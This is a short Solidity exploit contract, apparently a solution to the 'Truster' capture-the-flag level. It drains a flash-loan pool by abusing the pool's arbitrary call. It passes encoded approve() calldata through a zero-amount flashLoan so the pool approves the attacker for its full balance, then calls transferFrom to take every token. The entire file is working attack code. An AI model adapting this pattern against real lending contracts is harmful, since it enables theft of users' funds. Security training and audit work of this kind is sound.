// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../truster/TrusterLenderPool.sol";


contract AttackerContract {

    IERC20 public immutable token;
    TrusterLenderPool public pool;

    constructor (address _pool, address _token) {
        pool = TrusterLenderPool(_pool);
        token = IERC20(_token);
    }

    // function approve() public {
    //     token.approve(address(this), token.balanceOf(pool));
    // }

    function executeTransferFromPool() public {

        pool.flashLoan(0, msg.sender, address(token), abi.encodeWithSignature("approve(address,uint256)", address(this), token.balanceOf(address(pool))));
        token.transferFrom(address(pool), msg.sender, token.balanceOf(address(pool)));
    }
}